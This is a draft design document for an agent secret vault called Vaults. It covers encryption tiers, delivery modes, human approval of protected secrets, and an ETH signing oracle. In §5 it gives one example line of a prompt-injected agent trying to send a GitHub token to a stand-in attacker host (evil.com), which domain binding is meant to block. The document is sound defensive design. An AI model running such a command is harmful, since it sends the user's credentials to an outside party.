# Vaults — secret management for agents

Status: **v2 draft for discussion** (no implementation yet)
Owner: Alex + agent session `sestvmy6e5c8e`
Date: 2026-06-12 (v2: same day, after first review round)

v2 changes: machine-key lifecycle + loss/recovery model (§8.2), decryption-locus
analysis and decision (§8.4), approval locked to web-only (§9), signer goes
straight to secp256k1/ETH with an open-source stack and a mnemonic ceremony
(§5 M3), detailed API/CLI surface (§11) and end-to-end flows (§12), decision
log (§16).

## 1. Background

Agents constantly need third-party credentials (API keys, tokens, signing keys).
Today in Avibe every credential is plaintext: platform tokens and provider API
keys live in `~/.avibe/config/config.json` / `~/.avibe/state/settings.json`, and
anything an agent needs at runtime ends up pasted into chat, written into
`.env` files by hand, or exported in the shell. Whatever enters the
conversation enters the LLM context — transcripts, IM history, provider logs.

PR #555 ("redact config secrets") added response-side masking and a frontend
`secretFields.ts` registry — the first step of the same arc. The Web UI shell
already reserves the surface: a `/vaults` route and `VaultsPage.tsx`
placeholder exist alongside Agents / Skills / Harness.

The industry hit the same wall in 2025–2026: GitGuardian found 24k+ secrets
exposed in MCP config files; OWASP lists credential leakage via prompt context
as a top LLM risk; a wave of "vault for agents" products appeared
(Infisical agent-vault, Agentic Vault, Axis, Arcade, Composio — see §14).
The shared insight, which is also the core principle of this design:

> **Secrets must never enter the model's context. The model handles secret
> *names*; the platform handles secret *values*.**

## 2. Goals and non-goals

Goals:

1. **Store** — a Vaults page where the user manages named secrets
   (`NAME` → value, env-var mental model), with two protection tiers.
2. **Deliver** — agents obtain secrets via CLI with values never written to
   stdout; delivery is indirect (child-process env, file render, signing,
   brokered HTTP), so values stay out of context by construction.
3. **Ask** — agents can request a missing secret; the user fills it through a
   trusted UI channel (never through chat text), and the agent is woken up
   with the *name only*.
4. **Approve** — protected secrets require explicit, per-use human approval
   with an auditable record (inbox card: who asks, which key, in what form).
   Approval happens on the web UI only (decided, §9).
5. **Link** — secrets relate to Skills (skill declares what it needs; vault
   shows per-skill fill-in status).
6. **Sign** — the vault holds keypairs and acts as a signing oracle: the
   private key never leaves the vault; agents submit payloads and receive
   signatures. First-class target: an ETH wallet (secp256k1, EIP-155/191/712)
   built on audited open-source libraries (decided, §5 M3).

Non-goals (now):

- Team/multi-user sharing — Avibe is personal; one user per instance.
- Replacing provider OAuth flows (Claude/Codex login stays as is); migrating
  platform/provider config secrets into the vault is a later unification (§15 P3).
- Defending against a fully malicious agent running as the same OS user (§3).
- On-chain transaction *broadcasting* — signing is the vault's job;
  broadcasting needs no secret and stays agent-side (§5 M3).

## 3. Threat model

What we defend against, in increasing strength:

| # | Threat | Defense |
| --- | --- | --- |
| T1 | Secret value accidentally enters LLM context / transcripts / IM history | values never on stdout; injection happens below the agent's text channel; dynamic ask goes through UI, not chat |
| T2 | DB/file exfiltration (backups, `vibe data query`, casual `cat`) | everything encrypted at rest (envelope, §8); vault tables denylisted in `data query` |
| T3 | Agent (possibly prompt-injected) uses a high-value secret without the user knowing | `protected` tier: per-use approval enforced **cryptographically** — the key material to decrypt simply is not on the machine until the user supplies it |
| T4 | Agent exfiltrates the value after legitimate delivery | sign/proxy modes: value never materializes in agent-accessible space at all; plus outbound redaction filter (§10) as a tripwire |

Explicitly out of scope, stated honestly:

- A malicious process running as the same OS user can read injected files,
  inspect child-process environments, or call the same decryption code path
  the CLI uses for the `standard` tier. The `standard` tier prevents
  *accidents and remote exfiltration*, not a determined local attacker.
  The `protected` tier and the sign/proxy modes are the answer when that
  matters — that's why the design is a ladder, not a single mechanism.
- Approval fatigue is a real failure mode; approval cards must show enough
  context (requester, delivery form, payload preview) to make rubber-stamping
  visibly risky, and per-secret policies (§9) reduce prompt frequency.

## 4. Concepts and data model

One new domain, four tables (SQLAlchemy `Table` in `storage/models.py` +
Alembic migration, per existing pattern), plus vault-level config.

### `vault_secrets`

| column | notes |
| --- | --- |
| `id`, `created_at`, `updated_at` | usual |
| `name` | unique, ENV-style (`^[A-Z][A-Z0-9_]*$`), global namespace |
| `kind` | `static` (a value) \| `keypair` (a signing key) |
| `protection` | `standard` \| `protected` (see below) |
| `ciphertext`, `nonce`, `wrap_meta` | envelope-encrypted value / private key (§8); `wrap_meta` JSON holds the wrapped DEK copies + KDF params; **no plaintext column exists** |
| `public_meta` | JSON: description; for `keypair`: algo, public key, derived address, derivation path |
| `policy` | JSON: allowed delivery modes, allowed hosts (proxy), always-ask flag |
| `last_used_at`, `use_count` | surfaced in UI |

Protection tiers (refining the original 明文/加密 framing):

- **`standard`** ("plain" in UX terms): no user interaction to use. *Still
  encrypted at rest* under a machine key (§8.2). Rationale: `vibe data query`
  has no table denylist today, DB files travel in backups, and at-rest
  encryption is nearly free. "Plaintext" describes the *experience* (zero
  friction), not the storage.
- **`protected`** ("encrypted" in UX terms): wrapped under a key derived from
  a user secret (vault password; later additionally passkey PRF). Every use
  requires the user to approve and supply the unlock factor. The daemon
  *cannot* decrypt these alone — approval is enforced by cryptography, not by
  an `if`.
- `keypair` secrets are always `protected` (hard rule, per requirement).

### `vault_requests` — one queue for everything that needs a human

Unifies the interactive flows (fill-a-missing-secret, use-a-protected-secret,
sign, proxy, key generation) into a single object: one inbox surface, one card
component, one audit trail.

| column | notes |
| --- | --- |
| `id`, `created_at`, `decided_at`, `expires_at` | |
| `request_type` | `provision` (fill a missing secret) \| `access` (use a protected secret) \| `sign` \| `proxy` \| `keygen` |
| `secret_name` | target |
| `requester` | JSON: session_id, agent name/backend, run id — rendered on the card |
| `delivery` | JSON: mode (`env`/`file`/`sign`/`proxy`) + details (env var name, file path, payload digest + decoded preview, target host) |
| `status` | `pending` → `fulfilled`/`approved`/`denied`/`expired`/`canceled` |
| `message_id` | the chat message that carried the ask card, if any |

### `vault_links`

`secret_name` ↔ `skill_name`, plus `source` (`skill_meta` \| `agent` \| `user`)
and `required` flag. Skill-meta links are derived (re-synced from SKILL.md
frontmatter); agent/user links are explicit rows.

### `vault_audit`

Append-only: `ts`, `event` (`created/updated/deleted/delivered/denied/signed/
proxied/redacted/...`), `secret_name`, `requester`, `delivery` summary,
`request_id`. Values never appear in audit rows. Surfaced as a log tab on the
Vaults page.

### Vault config

Vault-level state (password salt + KDF params, machine-key mode, key-check
value to detect wrong password) lives in `state_meta` under `vault:*` keys —
no extra table needed.

`vibe data query` gains a denylist for `vault_secrets` (ciphertext anyway,
but no reason to expose it); `vault_requests`/`vault_links`/`vault_audit`
remain queryable.

## 5. Delivery modes — the security ladder

Four ways a secret leaves the vault, ordered by exposure. Per-secret `policy`
can restrict which modes are allowed (e.g. a GitHub PAT: proxy-only).

### M1 `run` — child-process env (default, the `op run` pattern)

```bash
vibe vault run --env OPENAI_API_KEY --env DB_URL=PROD_DB_URL -- python sync.py
```

CLI resolves values (through the daemon, §7), injects them into the **child
process env only**, and execs. Nothing on stdout; nothing persists after the
child exits. This is the right default because harness Bash calls don't share
shell state anyway — a child wrapper is strictly better than `export`.

### M2 `inject` — file render (the `op inject` pattern)

```bash
vibe vault inject --out .env --keys OPENAI_API_KEY,SENTRY_DSN   # dotenv format
vibe vault inject --template deploy.yaml.tpl --out deploy.yaml  # {{ vault.NAME }} placeholders
```

For tools that can't take env. Written `0600`; recorded in audit with path;
optional `--ttl 10m` registers a daemon-side cleanup. The agent is told the
file path, never the content.

### M3 `sign` — signing oracle / ETH wallet (key never leaves)

Decided: go straight to the wallet use case — secp256k1 + ETH transaction
signing is the showcase; generic ed25519 signing rides along for free
(`cryptography` has it built in).

**Open-source stack (all in-process Python libraries, no external service):**

- [`coincurve`](https://github.com/ofek/coincurve) — bindings to
  **libsecp256k1** (Bitcoin Core's audited C library; the same curve code
  every major wallet relies on).
- [`eth-account`](https://github.com/ethereum/eth-account) (MIT, the
  web3.py-family signer) — EIP-155 transaction signing, EIP-191
  `personal_sign`, **EIP-712 typed-data signing** (required by real dapps),
  BIP-39/BIP-32 HD-wallet derivation for mnemonics.
- `eth-utils` / `eth_abi` for address derivation and calldata decoding
  (approval previews).
- Shipped as an optional extra: `pip install avibe-os[wallet]` — core Vaults
  has zero heavy crypto deps beyond what's already in-tree.

Architectural prior art: geth's **clef** (external signing oracle with an
approval rule engine) is the reference model; HashiCorp Vault Transit
("sign as API, keys non-exportable") and Turnkey/Coinbase Agentic Wallets
(TEE/MPC + policy engine) are the cloud-grade versions. We implement the
local personal-scale equivalent: in-process libs + our own approval UI;
their policy engines (spend caps, contract allowlists) are the P3 upgrade
path.

**Key ceremony — generation is web-only.** Agents may *request* a wallet
(`vault_requests(keygen)`), but generation happens on the Vaults page:
generate BIP-39 mnemonic → display **once** in the browser for the user to
back up (standard wallet UX) → derive key → encrypt under the protected tier
→ store. The mnemonic never appears in CLI output or chat, so it can never
enter agent context. Recovery model: lost vault password → restore wallet
from the mnemonic; this is why keypairs do not get a "re-enter the value"
escape hatch like API keys do.

**Sign vs broadcast separation.** The vault signs; the agent broadcasts.

```bash
# agent prepares an unsigned tx (nonce/gas/chainId via any RPC it likes)
vibe vault sign --key ETH_MAIN --eth-tx tx.json --out signed.hex   # approval-gated
# agent broadcasts signed.hex itself (cast publish / web3) — no secret needed
```

Signatures, public keys, and addresses are not secrets → stdout is fine.
Every sign is an approval card with a decoded preview: `chainId`, `to`,
`value` (ETH), `gas`, `nonce`, function selector + decoded args where ABI is
known, raw calldata otherwise — the hardware-wallet UX. `--message` /
`--typed-data` variants cover EIP-191/712.

### M4 `proxy` — brokered request (value never in agent space)

```bash
vibe vault fetch --auth GITHUB_PAT -- -X POST https://api.github.com/repos/x/y/issues -d @body.json
```

The daemon attaches the credential per the secret's auth template
(`Authorization: Bearer …` / header / query param) and forwards; the agent
sees only the response. **Domain binding** is the killer property: the secret
carries an allowed-hosts list, deny by default — a prompt-injected
`fetch --auth GITHUB_PAT https://evil.com` fails closed regardless of what
the model was tricked into wanting.

P3 option: a transparent MITM proxy (`HTTPS_PROXY` + local CA) with dummy
placeholder env values that get swapped at egress — the Infisical agent-vault
trick, where even a leaked env var leaks only `__github_pat__`. Powerful but
invasive (CA trust install); evaluate embedding their MIT Go binary as an
optional component (like Show Runtime) vs. building on `mitmproxy`. The
explicit broker ships first: zero setup, same isolation for the common case.

## 6. Dynamic ask — `$<NAME>` and `vibe vault request`

Two entry points, one `vault_requests(provision)` object:

**Conversational markup.** The agent writes `$<OPENAI_API_KEY>` in its reply.
`core/reply_enhancer.py` (the existing chokepoint that already parses silent
blocks / file links / quick replies) extracts it into
`EnhancedReply.secret_requests`, the dispatcher creates the request row, and:

- **Web/workbench**: the message renders a **SecureInputCard** (the
  `lib/mentions.ts` linkify pattern: rewrite to an `avibe-secret:NAME` link,
  custom renderer in `ui/markdown.tsx`). Card = name + requester + protection
  picker + masked input + Save-to-Vault. Submission goes `POST /api/vault/…`
  over TLS — never into the chat transcript.
- **IM platforms** (no secure inputs): the marker is replaced with
  `🔐 Agent requests OPENAI_API_KEY → [Open Vaults](https://<tunnel>/vaults?request=<id>)`
  via the existing per-platform formatter layer.

Parsing rules: `\$<[A-Z][A-Z0-9_]*>` outside code fences only (same fence
guard as mentions); unknown/already-configured names degrade gracefully.

**CLI (works for headless/scripted flows and is the blocking primitive):**

```bash
vibe vault request OPENAI_API_KEY --reason "sync script needs OpenAI" --wait 600
vibe vault request AWS_KEY --skill deploy-aws --no-wait
```

`--wait` long-polls the daemon until fulfilled/denied/timeout, then exits 0/1
with a JSON envelope — so an agent can ask and *keep working when the answer
arrives*, mid-turn. `--no-wait` returns immediately; on fulfillment the daemon
enqueues a `hook_send` back into the originating session (existing
`TaskExecutionStore.enqueue_hook_send` path, like watches).

**Hard rule: the fulfillment/wake-up message carries the secret *name* only,
never the value.** ("`OPENAI_API_KEY` is now available in the vault — use
`vibe vault run …`.") Putting the value into the resume prompt would undo the
entire design.

## 7. Where enforcement lives (CLI ↔ daemon)

Today most CLI commands read SQLite directly. Vault value paths must instead
go **through the daemon** (the existing internal UDS server,
`vibe/internal_client.py` pattern — new `/internal/vault/*` endpoints):

- one process owns decryption, policy checks, audit writes, approval
  orchestration, and TTL cleanups;
- `protected`-tier approvals need the daemon anyway (SSE to browser, IM
  notifications, request lifecycle);
- the CLI receives plaintext only over the local socket, holds it in memory,
  injects (M1/M2), and forgets.

Metadata commands (`list`, `link`, `status`) may keep direct-DB reads like
their siblings. If the daemon is down, value commands fail with a clear
"vault requires the running service" error (standard-tier offline fallback is
a possible later convenience; not in scope).

## 8. Crypto design

### 8.1 Envelope

Boring and standard (validated by Bitwarden/1Password architecture and the
PRF guidance in §14):

```
value --AES-256-GCM--> ciphertext            (DEK: random 32B per secret)
DEK   --wrapped by--> KEK(s)
  standard:  KEK_machine  = random 32B machine key (§8.2)
  protected: KEK_password = Argon2id(vault password, vault salt)
             KEK_passkey  = HKDF(WebAuthn PRF output)        [P2]
```

A DEK can be wrapped multiple times (`wrap_meta` holds all copies): a
protected secret wrapped by password + N passkeys survives losing any single
factor as long as one remains; the password is always the recovery root.

### 8.2 Machine key (standard tier): source, loss, recovery

Answers to "where does it come from / can it be lost":

**Source.** 32 random bytes (`os.urandom`) generated lazily on first vault
write. Never derived from anything; nothing to guess.

**Storage — default: key file.**
`~/.avibe/state/vault/machine.key`, `0600`, owner-only dir. Because it lives
*inside* `~/.avibe`, every backup or migration that carries the state dir
carries the key: **there is no new loss mode** — you lose the machine key
only in scenarios where you've lost the database (and everything else) too.
This is deliberate: standard-tier recoverability must match the DB's, and
"copy `~/.avibe` to the new machine" must keep working unchanged.

**Storage — opt-in hardening: OS keychain.** A vault setting moves the key
into the OS keychain via python `keyring` (macOS Keychain / Windows
Credential Locker / Linux Secret Service). Gain: key and data are physically
separated — stealing the DB *and* every file under `~/.avibe` is still not
enough. Cost: copying `~/.avibe` alone no longer migrates the vault, so this
mode requires an explicit export step:

```bash
vibe vault key export --out vault-recovery.key --passphrase-stdin   # Argon2id-wrapped
vibe vault key import vault-recovery.key
```

Headless boxes (our Incus tenants have no Secret Service) stay on file mode
automatically.

**Failure UX.** If ciphertext exists but the machine key is missing/mismatched
(detected via a key-check value), the vault reports exactly which secrets are
affected and offers two paths: import the exported key, or re-enter the
values (standard-tier secrets are API keys — re-obtainable from providers;
annoying, not fatal). Silent data loss is not possible; silent *wrong-key*
decryption is prevented by AES-GCM authentication.

**What each mode honestly defends.**

| mode | defends | does not defend |
| --- | --- | --- |
| key file (default) | sqlite-only exfil (`vibe data query`, DB/WAL copy, partial backups that grab the DB) | an attacker who reads the whole `~/.avibe` dir (key is there too); same-user processes |
| OS keychain (opt-in) | all of the above **plus** full `~/.avibe` exfil | a same-user process calling the keychain API (macOS grants same-binary access silently); a root attacker |

Wallet keys never depend on the machine key — `keypair` is always
`protected`, so its recovery model hangs on the vault password + mnemonic
(§5 M3), not on this section.

### 8.3 Protected tier: unlock factors and recovery

- **Vault password** (P1): Argon2id (`argon2-cffi`; interactive-grade
  parameters, calibrated ~0.5–1s) → KEK. Set/changed on the Vaults page;
  changing the password re-wraps every protected DEK (cheap — DEKs are 32B;
  ciphertexts untouched).
- **Passkey PRF** (P2): WebAuthn PRF output → HKDF → KEK, as an *additional*
  wrap alongside the password. 2026 support is good on synced providers
  (iCloud/Google/Windows Hello) but not universal — PRF is an enhancement,
  never the only factor.
- **Recovery model, stated plainly:** forgetting the vault password with no
  passkey wrap means protected *values* are unrecoverable by design — for
  API-key-like secrets the remedy is re-entry; for wallets the remedy is the
  BIP-39 mnemonic backed up at the key ceremony. There is no server-side
  reset because there is no server.

### 8.4 Where protected-tier decryption runs (decided)

The question from review: "if the browser decrypts, the plaintext still goes
back to the daemon — isn't that the same?" Honest analysis:

- **What's identical:** the *delivered value* reaches the daemon in both
  designs — it must, to be injected into env/file. Per-use exposure of the
  secret being used is the same.
- **Difference 1 — what else is exposed.** Daemon-side KDF means the **vault
  password** (the master factor for *every* protected secret, forever)
  transits and sits in daemon memory on every approval. Browser-side keeps
  the password on the user's device; the daemon only ever sees the one value
  being delivered. Under passive daemon-side exposure (memory dumps, debug
  logs, non-targeted scrapers), blast radius shrinks from "whole vault +
  future" to "this one secret".
- **Difference 2 — passkeys force the client side anyway.** WebAuthn PRF is
  physically a browser ceremony; the authenticator hands the PRF output to
  the page. P2 needs browser-side crypto regardless of this decision.
- **The honest ceiling:** the browser runs JS *served by the daemon*. An
  actively malicious daemon can ship JS that exfiltrates the password —
  client-side crypto here is exposure-minimization, not E2EE against the
  server (the standard Bitwarden-web-vault caveat). Both designs trust the
  daemon's integrity; they differ in how much a *passively leaky* daemon
  costs you.

**Decision:** P1 ships daemon-side (password over TLS → `argon2-cffi` →
zeroize best-effort); P2 moves KDF + DEK-unwrap into the browser (argon2
WASM for the password path, WebCrypto HKDF for PRF) together with passkey
support, after which the password never leaves the device. The wire format
(`wrap_meta`) is designed for client-side unwrap from day one so P2 is a
pure client change.

### 8.5 Primitives and dependencies

- `pyca/cryptography` (already in-tree via web push): AES-256-GCM, HKDF,
  ed25519.
- `argon2-cffi` (new, small): Argon2id KDF. (Scrypt from `cryptography` was
  the zero-new-dep alternative; Argon2id is the modern recommendation and the
  dep is tiny — proposed.)
- `keyring` (new, optional import): OS keychain mode only.
- `coincurve` + `eth-account` + `eth_abi`: behind the `[wallet]` extra (P2).
- Python cannot truly zeroize memory; noted and accepted for a local-first
  tool (a native helper is not worth it now).
- Web UI never gets values back: reads return masked previews (`sk-…cd34`,
  reusing the #555 `secretFields.ts` pattern). `standard` values may offer
  explicit reveal-on-click (open question); `protected` values never.

## 9. Approval flow (protected tier, sign, proxy)

**Decided: approval happens on the web UI only.** IM surfaces receive
notifications with a deep link, never an approve button — an IM account is a
weaker authenticator than the OIDC-gated web session, and approval is exactly
the moment that distinction matters.

1. Agent runs `vibe vault run --env STRIPE_KEY -- …` where `STRIPE_KEY` is
   `protected` → daemon creates `vault_requests(access, pending)`; CLI blocks.
2. Fan-out through existing rails: SSE event → workbench toast + Vaults badge
   + Inbox; IM notification with deep link; web push later.
3. The card shows: secret name, requester (agent/session/run), delivery form
   ("env `STRIPE_KEY` to command `python billing.py`" / file path / decoded
   tx preview for sign / target URL for proxy), reason if provided.
4. User enters vault password (P1; passkey in P2) → approve once / deny.
   (Optional later: scoped grants — "allow this secret for this session for
   1h" — to fight approval fatigue.)
5. Daemon decrypts, hands the value to the blocked CLI over UDS, writes
   audit, fires `vault.request.decided` SSE. Deny/timeout → CLI exits nonzero
   with a clean, relayable error.

`standard`-tier uses skip 1–4 (silent, audited; per-secret `always_ask`
policy flag can opt in to prompts).

## 10. Outbound redaction (tripwire layer)

Because the dispatcher (`core/message_dispatcher.py`) is the single outbound
chokepoint, we can scan every outgoing message for known plaintext values
(standard-tier values; protected-tier values during their active grant
window) and replace with `[REDACTED:NAME]` + audit event + warning toast.
Exact-match (plus base64/url-encoded variants) only — cheap, no heuristics.
This converts "agent accidentally echoed the secret" from a breach into a
logged near-miss. Recommended for P1.

## 11. API and CLI surface

### REST (`/api/vault/*`, behind existing web auth + CSRF)

| endpoint | purpose |
| --- | --- |
| `GET /api/vault/secrets` | masked list (+ links, last_used, policy) |
| `POST /api/vault/secrets` | create `{name, value, protection, policy?}` |
| `PATCH /api/vault/secrets/{name}` | rotate value / edit policy / upgrade protection (downgrade requires unlock) |
| `DELETE /api/vault/secrets/{name}` | delete |
| `GET /api/vault/requests?status=pending` | inbox feed |
| `POST /api/vault/requests/{id}/fulfill` | provision: `{value, protection}` |
| `POST /api/vault/requests/{id}/approve` | access/sign/proxy: `{password}` (P1) / client-unwrapped material (P2) |
| `POST /api/vault/requests/{id}/deny` | deny |
| `GET/POST/DELETE /api/vault/links` | skill linkage |
| `GET /api/vault/audit?secret=&limit=` | audit log |
| `POST /api/vault/keys/generate` → `…/confirm` | web-only key ceremony (mnemonic shown once between the two calls) |
| `GET/POST /api/vault/config` | vault password set/change, machine-key mode, KDF params |

SSE additions on the existing `/api/events` stream: `vault.request.new`,
`vault.request.decided`, `vault.secrets.changed`.

### Internal UDS (`/internal/vault/*`, daemon ⇄ CLI)

| endpoint | purpose |
| --- | --- |
| `POST /internal/vault/resolve` | `{names[], mode, requester, wait_timeout}` → values map; creates `access` requests for protected names and blocks until decided |
| `POST /internal/vault/provision` | create ask; optional block-until-fulfilled |
| `POST /internal/vault/sign` | `{key, payload, sig_type}` → blocks on approval → signature |
| `POST /internal/vault/fetch` | brokered HTTP (P2) |
| `GET /internal/vault/requests/{id}/wait` | long-poll a request |

### CLI (`vibe vault …`)

| command | phase | notes |
| --- | --- | --- |
| `set NAME [--protected] --stdin\|--from-file f` | P0 | argv values rejected by design (shell history / agent context); humans normally use the web UI |
| `list [--skill S] [--json]` | P0 | names + metadata only |
| `rm NAME` | P0 | |
| `run --env NAME[,N2] [--env ALIAS=NAME] -- cmd…` | P0 | M1 |
| `inject --keys A,B --out f [--format dotenv\|json]` / `--template t --out f [--ttl 10m]` | P0 | M2 |
| `request NAME [--reason s] [--skill s] [--protected] [--wait s\|--no-wait]` | P0 | §6 |
| `link/unlink --skill S NAME…` | P1 | |
| `audit [--secret NAME]` | P1 | |
| `key export/import` | P1 | machine-key recovery (§8.2) |
| `sign --key NAME (--eth-tx f\|--message s\|--typed-data f\|--in f) [--out f]` | P2 | M3; approval-gated |
| `fetch --auth NAME [curl-like args]` | P2 | M4; domain-bound |

No command ever prints a secret value. There is deliberately no
`vibe vault get`.

## 12. End-to-end flows

**A. Standard secret, M1 (silent):** agent → `vault run --env X -- cmd` →
CLI → UDS `resolve` → daemon: policy check → machine-KEK unwrap → value over
UDS → CLI spawns child with env → audit `delivered`. No user interaction.

**B. Protected secret, M1 (approval):** same until daemon sees
`protection=protected` → create `access` request → SSE + IM notify → CLI
blocks → user opens card on web, reviews delivery form, enters password →
daemon unwraps, completes the blocked `resolve` → child spawns → audit.
Deny/timeout → CLI exits 1 with JSON error the agent can relay.

**C. Dynamic ask, web:** agent emits `$<NEW_KEY>` → reply_enhancer extracts →
request row + SecureInputCard in transcript → user types value, picks tier,
saves → `fulfill` → daemon wakes the waiting CLI (or hook_sends "NEW_KEY is
now available" — name only) → agent proceeds with `vault run`.

**D. Dynamic ask, IM:** same, but the message carries a deep link to
`/vaults?request=<id>`; user fills on web; same wake-up.

**E. ETH wallet:** user (or agent via `keygen` request) → web ceremony:
mnemonic shown once, confirmed, key stored protected → agent prepares
`tx.json` (nonce/gas via its own RPC) → `vault sign --key ETH_MAIN --eth-tx
tx.json --out signed.hex` → approval card with decoded `to/value/gas/chainId/
selector` → password → signature file → agent broadcasts via its own RPC.
Private key and mnemonic never exist outside vault memory + the user's
one-time browser view.

## 13. Skills integration

1. **Meta header** (primary): SKILL.md frontmatter gains a `secrets` field —

   ```yaml
   ---
   name: deploy-aws
   secrets:
     - name: AWS_ACCESS_KEY_ID
       required: true
       description: IAM key with deploy permissions
     - name: SLACK_WEBHOOK_URL
       required: false
   ---
   ```

   Avibe reads skill metadata exclusively through `askill --json`
   (`core/services/skills.py`), so askill (our repo) must parse/pass this
   field through. Vaults page gets a "Skills" view: per-skill required keys
   with ✓ configured / ✗ missing status and one-click fill; `vault_links`
   rows are synced from this with `source=skill_meta`.

2. **Agent CLI**: `vibe vault link --skill deploy-aws AWS_ACCESS_KEY_ID` —
   when an agent discovers an undeclared need mid-run, it links and then
   `vibe vault request`s; the provision card shows the skill context.

3. **Manual UI**: link/unlink from either the secret detail or the skill
   detail side.

Names are the join key (global env-style namespace — same mental model as
env vars; per-skill aliasing is deliberately out of scope until proven needed).

## 14. Prior art and library survey

Patterns we adopt:

- **Injection UX** — 1Password CLI [`op run` / `op inject` / secret
  references](https://developer.1password.com/docs/cli/secret-references/);
  same shape in [Infisical `infisical run`](https://infisical.com/docs/documentation/platform/secrets-mgmt/overview).
  M1/M2 are these patterns, vault-local.
- **Brokered credentials / auth proxy** —
  [Arcade.dev](https://docs.arcade.dev/en/get-started/about-arcade) (tokens
  injected into tool context, "LLM never sees the token", just-in-time user
  authorization) and [Composio](https://docs.composio.dev/docs/authentication)
  (Connect Links ≈ our dynamic ask). Validates M4 and the ask flow.
- **Vault-for-agents OSS** —
  [Infisical agent-vault](https://github.com/Infisical/agent-vault) (MIT, Go;
  MITM proxy + dummy-placeholder substitution at egress; egress allowlists;
  master password unset after read; "Preview" maturity, ~1.7k stars);
  Agentic Vault (MCP server, per-secret host/command/env allowlists, deny by
  default, AGPL); Axis (`agent-secrets-vault`, master key in OS keychain,
  localhost dashboard); Cerberus (Vaultwarden + `{{password}}` substitution
  below the AI layer). None has our IM surface, inbox approvals, or Skills
  linkage — that's the Avibe-native value; their egress-binding and
  placeholder ideas are worth stealing.
- **Signing oracle / wallet** — geth `clef` (local signing oracle + rule
  engine — the architectural reference); HashiCorp Vault Transit;
  [Turnkey](https://www.turnkey.com/solutions/ai-agents) / Privy /
  [Coinbase Agentic Wallets + AgentKit](https://github.com/coinbase/agentkit)
  (TEE/MPC custody + policy engines: auto-sign under $X, human approval
  above). Our M3 is the local personal-scale version on
  `coincurve`/`eth-account`; policy engine later; TEE custody is the upgrade
  path if stakes grow.
- **Passkey-derived encryption** —
  [WebAuthn PRF](https://developers.yubico.com/WebAuthn/Concepts/PRF_Extension/);
  [Bitwarden ships passkey vault unlock](https://bitwarden.com/blog/prf-webauthn-and-its-role-in-passkeys/);
  2026 status per [Corbado](https://www.corbado.com/blog/passkeys-prf-webauthn):
  synced providers (iCloud/Google/Windows Hello) solid, iOS+security-key gap
  remains → PRF as enhancement over password, multi-wrap DEK.
- **Libraries** — [`keyring`](https://pypi.org/project/keyring/) (OS keychain;
  macOS caveat: same-binary access is silent — fine for our machine-key tier),
  `pyca/cryptography` (already in-tree), `argon2-cffi`,
  [PyNaCl](https://pypi.org/project/PyNaCl/) (alternative misuse-resistant
  stack if we'd rather `SecretBox` than AESGCM), `coincurve`/`eth-account`
  (wallet), `py_webauthn` (RP-side PRF, P2).

Why not embed an existing vault wholesale: Infisical proper is a
Postgres+Redis+Node service (absurd for a personal local-first tool);
agent-vault is proxy-shaped, "Preview", and has no human-approval loop — and
the product surface we actually need (Vaults page, IM cards, inbox, Skills
linkage, dynamic ask) is Avibe-native regardless. Build the store thin on
standard primitives; consider agent-vault as an optional P3 transparent-proxy
component.

## 15. Phasing

**P0 — store + deliver + ask (the useful core)**
`vault_secrets` (standard tier) + machine-key envelope (file mode) + Alembic
migration; Vaults page CRUD (masked inputs, reuse `secretFields.ts`
patterns); daemon `/internal/vault/*` + `/api/vault/*`; CLI `set / list / rm
/ run / inject / request`; `$<NAME>` markup → web SecureInputCard + IM deep
link; `vault_audit` + audit tab; `data query` denylist.

**P1 — protected tier + approvals + tripwire**
Vault password (Argon2id, daemon-side), protected secrets, unified
`vault_requests` approval cards (web-only approve), SSE/IM/inbox
notifications, outbound redaction filter, `vibe vault link` + skills
`secrets:` frontmatter (askill change) + per-skill status view, keychain
mode + `key export/import`.

**P2 — wallet + passkeys + broker**
`[wallet]` extra: key ceremony (BIP-39, web-only mnemonic), `sign` with
decoded ETH previews (EIP-155/191/712); WebAuthn PRF unlock + client-side
KDF/unwrap migration (§8.4); explicit `vibe vault fetch` broker with
per-secret host allowlists.

**P3 — transparent proxy + unification + policy**
Transparent MITM proxy option (embed agent-vault vs mitmproxy build);
migrate platform/provider config secrets into the vault (closing the #555
arc); signer policy engine (caps/allowlists); session-scoped grants.

## 16. Decision log

Locked (review round 1, 2026-06-12):

1. Approval is **web-only**; IM gets notification + deep link, no approve
   action.
2. Signer goes **straight to secp256k1/ETH** on an open-source stack
   (`coincurve` + `eth-account`), generic ed25519 as a freebie.
3. Phasing P0→P3 structure approved (details still under discussion).

Proposed in v2, awaiting confirmation:

4. `standard` tier = machine-key encryption at rest; **key file default**
   (zero new loss modes, `~/.avibe` copy keeps working), OS keychain as
   opt-in hardening with export/import (§8.2).
5. Protected-tier decryption: **P1 daemon-side, P2 browser-side** together
   with passkeys; wire format client-ready from day one (§8.4).
6. Wallet key ceremony is **web-only** (mnemonic never in CLI/chat) (§5 M3).
7. Argon2id via `argon2-cffi` (vs zero-dep Scrypt).

## 17. Open questions

1. **Reveal-on-click** for standard-tier values in the UI: allow or never?
2. **Blocking defaults**: `request --wait` / protected-access timeout
   (proposal: 10 min) and how a denied/expired wait reads to the agent.
3. **Scope**: secrets are instance-global (env-var model, recommended) — any
   per-project need on the horizon that should shape the schema now?
4. **askill**: confirm we own the frontmatter extension and the `--json`
   passthrough (file an issue against askill).
5. **Provider/platform unification timing**: agree the vault becomes the
   single secret store (P3) so #555-style redaction converges here?
6. **ETH preview depth for P2**: selector + raw calldata enough, or invest in
   ABI-driven decode + known-dangerous-selector warnings (`approve`,
   `setApprovalForAll`) from day one?
